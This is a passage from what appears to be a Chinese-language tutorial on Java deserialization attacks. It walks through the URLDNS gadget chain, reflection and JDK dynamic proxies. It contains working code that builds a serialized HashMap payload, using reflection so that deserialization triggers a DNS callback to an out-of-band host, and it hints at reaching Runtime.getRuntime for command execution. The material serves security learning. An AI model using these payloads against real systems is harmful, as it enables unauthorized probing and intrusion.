<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.boogipop.www.base;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Apply</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        ObjectInputStream ois=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        Object obj=ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">serialize</span> <span class="variable">unserialize</span> <span class="operator">=</span>(serialize)unserialize(<span class="string">&quot;1.bin&quot;</span>);</span><br><span class="line">        System.out.println(unserialize);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这边先进行序列化：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1670871141791-e2781327-2317-4781-9a49-561f91c9c13c.png#averageHue=%23f3f1ef&clientId=u6e6ff7f7-4c87-4&from=paste&height=432&id=u41d0a3e2&name=image.png&originHeight=540&originWidth=921&originalType=binary&ratio=1&rotation=0&showTitle=false&size=34063&status=done&style=none&taskId=uf4b44355-406e-4b7c-bd47-985afaef890&title=&width=736.8" alt="image.png"><br>奇怪的事情发生了，为什么我单单进行了序列化却发送了DNS请求？为了理清思路，我们断掉调试一下：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1670871182371-e9c5cb11-f50e-420d-88a9-930703b6890f.png#averageHue=%232e2c2b&clientId=u6e6ff7f7-4c87-4&from=paste&height=198&id=u4b7def64&name=image.png&originHeight=247&originWidth=1301&originalType=binary&ratio=1&rotation=0&showTitle=false&size=40323&status=done&style=none&taskId=u9b7fa8bc-1ac5-4934-9e70-92ae7ad7fbc&title=&width=1040.8" alt="image.png"><br>我们跟踪一下调试进程：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1670871261781-9016c4ae-a14e-4d64-90be-7c4ed611b6ec.png#averageHue=%23765d42&clientId=u6e6ff7f7-4c87-4&from=paste&height=110&id=ucaa2ac87&name=image.png&originHeight=138&originWidth=1480&originalType=binary&ratio=1&rotation=0&showTitle=false&size=32537&status=done&style=none&taskId=uf8d19080-a746-46a0-8d23-652c7704c4f&title=&width=1184" alt="image.png"><br>可以发现第一步是进入了HashMap的putVal函数，那根据上面的分析，接下来就会必定会进入<code>getHostAddress(u);</code>函数，因此触发了DNS请求，然后由于hashCode属性被更改，所以反序列化的时候无法触发DNS请求<br>因此问题就来了，我们怎么分辨是反序列化漏洞造成的DNS请求呢？假如需要满足我们的理想模型，那么是否在<code>hashmap.put(new URL(&quot;http://q1s3sx95kfyzsopaac8bc7goqfw5ku.burpcollaborator.net&quot;),1);</code>函数这里不该发送DNS请求，并且put后再把hashCode属性改为-1，这样反序列化才能再次调用<br>那么如何实现呢？这就得用到java反射了，接下来就围绕着这一点继续展开<br>最后给上一张自己画的逻辑图：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1670873849808-6df6d825-9a94-4af8-87e4-cd71a4aee599.png#averageHue=%23f5f5f4&clientId=u6e6ff7f7-4c87-4&from=paste&height=558&id=u772901f2&name=image.png&originHeight=698&originWidth=1835&originalType=binary&ratio=1&rotation=0&showTitle=false&size=33568&status=done&style=none&taskId=ubf571c78-6ccc-42f3-8673-ae121de93b9&title=&width=1468" alt="image.png"></p>
<h2 id="1x1-4-Java反射-URLDNS链"><a href="#1x1-4-Java反射-URLDNS链" class="headerlink" title="1x1.4 Java反射+URLDNS链"></a>1x1.4 Java反射+URLDNS链</h2><h3 id="1x1-4-1-先讲讲反射"><a href="#1x1-4-1-先讲讲反射" class="headerlink" title="1x1.4.1 先讲讲反射"></a>1x1.4.1 先讲讲反射</h3><p>首先说到反射，那有反射肯定就有正射，什么是正射和反射呢<br>正射：通过类来实例化对象，就是我们经常用的<code>new</code><br>反射：和正射恰巧相反，反射是通过实例化对象，反过来获取所在类的所有信息结构的一种方式，常用的方法有<code>getClass、forNmae、getConstructor.....</code>等等方法<br>下面就举一个小例子来带大家体会一下反射：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.boogipop.www.base;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.net.URI;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;1.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//正射</span></span><br><span class="line">        serialize s1=<span class="keyword">new</span> <span class="title class_">serialize</span>(<span class="string">&quot;kino&quot;</span>,<span class="number">12</span>);</span><br><span class="line">        <span class="comment">//反射</span></span><br><span class="line">        <span class="type">Class</span>  <span class="variable">c1</span> <span class="operator">=</span> s1.getClass();</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> c1.getConstructor(String.class, <span class="type">int</span>.class);<span class="comment">//通过反射获取构造函数，再获取实例化对象</span></span><br><span class="line">        serialize s2=(serialize)constructor.newInstance(<span class="string">&quot;Boogipop&quot;</span>,<span class="number">15</span>);</span><br><span class="line">        System.out.println(s2);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">age</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;age&quot;</span>); <span class="comment">//获取属性并且修改</span></span><br><span class="line">        age.set(s2,<span class="number">18</span>);</span><br><span class="line">        System.out.println(s2);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>运行如上代码是会报错的（嘻嘻）：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1670899685561-49544e4c-2e68-4cd2-8c9e-7abef38eecbf.png#averageHue=%232f2c2c&clientId=u2fc47934-71cb-4&from=paste&height=246&id=u743f0899&name=image.png&originHeight=308&originWidth=1894&originalType=binary&ratio=1&rotation=0&showTitle=false&size=61609&status=done&style=none&taskId=uabb46d11-91f5-490c-81ff-cd0250a7e75&title=&width=1515.2" alt="image.png"><br>这是因为私有属性默认是不能通过set方法修改的，所以我们得再加一条代码：<br><code>age.setAccessible(true);</code>：允许修改<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1670899727133-e37dbedc-752d-4d24-baf8-decdb68831a5.png#averageHue=%23302f2e&clientId=u2fc47934-71cb-4&from=paste&height=114&id=ua3da9dbf&name=image.png&originHeight=142&originWidth=672&originalType=binary&ratio=1&rotation=0&showTitle=false&size=18966&status=done&style=none&taskId=uecebdf9c-a3b8-4f3f-8548-780f4efe6ab&title=&width=537.6" alt="image.png"><br>其中serialize类就是之前用的，可以从代码中直观的感受正射和反射的区别，同理也可以用反射获取属性，方法….等等，总而言之反射是JavaSE中最后一个板块，相信看这篇文章的各位已经学的非常透彻了，我也就不多赘述，大致的流程就是如上代码</p>
<h3 id="1-1-4-2-解决1x1-4的疑惑"><a href="#1-1-4-2-解决1x1-4的疑惑" class="headerlink" title="1.1.4.2 解决1x1.4的疑惑"></a>1.1.4.2 解决1x1.4的疑惑</h3><p>我们的思路已经比较清晰了，要让HashMap在put时不触发DNS请求，那也就是不能让hashCode属性为-1，只需要随便改成一个其他的整型数即可<br>其次在这之后我们需要把hashCode的属性值再改为-1，因为这样反序列化时才能够触发DNS请求，这也就达到了我们想要实现的效果，这个效果也就是yoserial中<code>DNSURL.java</code>的核心功能代码<br>我们只需要用反射来修改类的属性即可，这个在上面提到过<br>修改后的代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.boogipop.www.base;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.net.URI;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;1.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        HashMap&lt;URL,Integer&gt; hashmap=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        URL url=<span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://rvqasmn68m3pwafv6v7hoixwfnld92.oastify.com&quot;</span>);</span><br><span class="line">        Class c1=url.getClass();<span class="comment">//反射获取URL类</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">hashcode</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        hashcode.setAccessible(<span class="literal">true</span>);<span class="comment">//允许访问</span></span><br><span class="line">        hashcode.set(url,<span class="number">1145</span>); <span class="comment">//修改hashCode</span></span><br><span class="line">        hashmap.put(url,<span class="number">1</span>); <span class="comment">//添加至hashmap集合中</span></span><br><span class="line">        hashcode.set(url,-<span class="number">1</span>); <span class="comment">//修改回-1</span></span><br><span class="line">        Serialize(hashmap);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>序列化未发现DNS请求：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1670908301816-8ae8f3f4-c8db-4643-8f2b-6dc2ce90a5a9.png#averageHue=%23f5f5f4&clientId=u2fc47934-71cb-4&from=paste&height=652&id=u1a18486e&name=image.png&originHeight=815&originWidth=1116&originalType=binary&ratio=1&rotation=0&showTitle=false&size=31246&status=done&style=none&taskId=ub948f3c5-c846-416a-b970-96f16c9f896&title=&width=892.8" alt="image.png"><br>反序列化收到DNS请求：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.boogipop.www.base;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Apply</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        ObjectInputStream ois=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        Object obj=ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">              unserialize(<span class="string">&quot;1.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1670908454051-34c9145f-3cd8-4085-978a-2f65d3a41da3.png#averageHue=%23f8f7f6&clientId=u2fc47934-71cb-4&from=paste&height=379&id=u99c3c528&name=image.png&originHeight=474&originWidth=1145&originalType=binary&ratio=1&rotation=0&showTitle=false&size=26404&status=done&style=none&taskId=u8cadad98-d0dc-4347-8b0c-f972670de28&title=&width=916" alt="image.png"><br>调用栈肯定就是我们之前分析的那样，我们可以打个断点调试：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1670908604356-e70c557e-449d-47b6-b52f-127e90567843.png#averageHue=%2361824e&clientId=u2fc47934-71cb-4&from=paste&height=458&id=u8c637319&name=image.png&originHeight=573&originWidth=1210&originalType=binary&ratio=1&rotation=0&showTitle=false&size=62920&status=done&style=none&taskId=u55eb2aec-147e-4ece-b25c-56a0eec0fe3&title=&width=968" alt="image.png"><br>可以看到hashCode的值在反序列化时就是-1，因此触发了请求：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1670908627751-6d7a7946-1178-42f8-a817-9fd898c447f3.png#averageHue=%232f2a2a&clientId=u2fc47934-71cb-4&from=paste&height=150&id=u516630f6&name=image.png&originHeight=187&originWidth=1265&originalType=binary&ratio=1&rotation=0&showTitle=false&size=30266&status=done&style=none&taskId=u080e74c5-d3ea-46af-9840-ed6f4b1baaf&title=&width=1012" alt="image.png"></p>
<h3 id="1X1-4-3-反射在Java反序列化中的利用"><a href="#1X1-4-3-反射在Java反序列化中的利用" class="headerlink" title="1X1.4.3 反射在Java反序列化中的利用"></a>1X1.4.3 反射在Java反序列化中的利用</h3><p>从上面的例子中可以发现一个很有意思的地方：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1670908951798-6ba8b0db-c991-4081-aa86-ce55c4e31c36.png#averageHue=%232e2d2c&clientId=u2fc47934-71cb-4&from=paste&height=36&id=u1e8133cb&name=image.png&originHeight=45&originWidth=649&originalType=binary&ratio=1&rotation=0&showTitle=false&size=8606&status=done&style=none&taskId=u63d4220e-c690-4105-8c99-e228f99406f&title=&width=519.2" alt="image.png"><br>这一条命令我们穿的参数是字符串，这是不是和PHP的eval函数（动态加载）有点相似了，因此在这里我们就可能引入本来不能序列化的类，比如<code>Runtime.getRuntime</code>，最典型的命令执行类<br>除此之外还有反射的invoke方法，可以让我们调用除了重名函数以外的函数</p>
<h2 id="1X1-5-JDK动态代理"><a href="#1X1-5-JDK动态代理" class="headerlink" title="1X1.5 JDK动态代理"></a>1X1.5 JDK动态代理</h2><h3 id="1x1-5-1-JDK静态代理"><a href="#1x1-5-1-JDK静态代理" class="headerlink" title="1x1.5.1 JDK静态代理"></a>1x1.5.1 JDK静态代理</h3><p>所谓的静态代理可以举一个很形象的例子，那就是	</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Rentinterace</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">rent</span><span class="params">()</span>;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">pay</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RentDirect</span> <span class="keyword">implements</span> <span class="title class_">Rentinterace</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">rent</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;租房&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">pay</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;付钱&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RentProxy</span> <span class="keyword">implements</span> <span class="title class_">Rentinterace</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> Rentinterace user;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">RentProxy</span><span class="params">(Rentinterace user)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.user=user;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">rent</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;中间商帮你租房&quot;</span>);</span><br><span class="line">        user.rent();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">pay</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;中间商帮你付款&quot;</span>);</span><br><span class="line">        user.pay();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        Rentinterace user=<span class="keyword">new</span> <span class="title class_">RentDirect</span>();</span><br><span class="line">        Rentinterace usr=<span class="keyword">new</span> <span class="title class_">RentProxy</span>(user);</span><br><span class="line">        user.pay();</span><br><span class="line">        user.rent();</span><br><span class="line">        usr.pay();</span><br><span class="line">        usr.rent();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>上述例子是一个完整的静态代理，可以看到RentProxy类就相当于中间商，“卡在”中间，我们可以通过它间接的去调用RentDierct类中的方法，但是静态代理有个缺点<br>就是假如我们修改接口，那么Direct类和Proxy类都需要修改，这就显得很麻烦，因此动态代理诞生了</p>
<h3 id="1X1-5-2-回到动态代理"><a href="#1X1-5-2-回到动态代理" class="headerlink" title="1X1.5.2 回到动态代理"></a>1X1.5.2 回到动态代理</h3><p>在Java中也提供了动态代理服务：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        Rentinterace user=<span class="keyword">new</span> <span class="title class_">RentDirect</span>();</span><br><span class="line">        <span class="comment">//动态代理</span></span><br><span class="line">        <span class="comment">//要代理的接口、要做的事情、classLoader</span></span><br><span class="line">        InvocationHandler userinvocationhandler=<span class="keyword">new</span> <span class="title class_">Userinvocationhandler</span>(user);</span><br><span class="line">         Rentinterace actionuser=(Rentinterace) Proxy.newProxyInstance(user.getClass().getClassLoader(), user.getClass().getInterfaces(),userinvocationhandler);</span><br><span class="line">        actionuser.rent();</span><br><span class="line">        actionuser.pay();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Userinvocationhandler</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span> &#123;</span><br><span class="line">    Rentinterace user;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Userinvocationhandler</span><span class="params">(Rentinterace user)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.user=user;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;这里是动态代理，我调用了方法:&quot;</span>+method.getName());</span><br><span class="line">        method.invoke(user,args);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>上述例子就是个动态代理的例子，我们调用了<code>Proxy.newProxyInstance</code>方法：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1670914728402-f3d43d13-4921-46c8-bf9b-9a411a037096.png#averageHue=%232f2e2e&clientId=ud716e218-f986-4&from=paste&height=142&id=u38c842e9&name=image.png&originHeight=178&originWidth=1361&originalType=binary&ratio=1&rotation=0&showTitle=false&size=27120&status=done&style=none&taskId=uf4eae58a-5fde-4442-b922-0023c9a6c65&title=&width=1088.8" alt="image.png"><br>可以看到上图中需要的是哪个参数，要代理的接口，类加载器，要处理的事情<br>其中要处理的事情就是一个<code>InvocationHandler</code>接口，我们要新建一个类去重写invoke方法，如上述代码，执行结果如下<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1670915171402-067bcf9d-f9c2-491a-8c81-00a364bb5b13.png#averageHue=%232e2e2e&clientId=ud716e218-f986-4&from=paste&height=129&id=u8153723e&name=image.png&originHeight=161&originWidth=732&originalType=binary&ratio=1&rotation=0&showTitle=false&size=9543&status=done&style=none&taskId=u74a75dd0-31bc-4ee3-bad7-162146fed28&title=&width=585.6" alt="image.png"><br>到这里JDK的动态代理就基本结束了</p>
<h3 id="1X1-5-3-动态代理和反序列化的关系"><a href="#1X1-5-3-动态代理和反序列化的关系" class="headerlink" title="1X1.5.3 动态代理和反序列化的关系"></a>1X1.5.3 动态代理和反序列化的关系</h3><p>举个例子吧，假如你想要执行的危险命令为<code>B.danger</code>,刚好有一个入口类是<code>A(Object)</code>,这个Object就是我们可控的参数，我们让Object为B类，但是A中的方法没有danger，只有<code>A.abc</code>&#x3D;&gt;<code>B.abc</code>，也就是不能执行命令，但是假如我们可控类是个代理类型的<code>O(Object)</code>,然后O里的可控参数O2刚好调用了danger，那也只需要让O2为B类即可，说的可能有点抽象，大家自行意会</p>
<h2 id="1X1-6-类的动态加载"><a href="#1X1-6-类的动态加载" class="headerlink" title="1X1.6 类的动态加载"></a>1X1.6 类的动态加载</h2><h3 id="1X1-6-1类加载与反序列化"><a href="#1X1-6-1类加载与反序列化" class="headerlink" title="1X1.6.1类加载与反序列化"></a>1X1.6.1类加载与反序列化</h3><p>在此之前需要介绍2个代码块，<strong>静态代码块和构造代码块</strong></p>
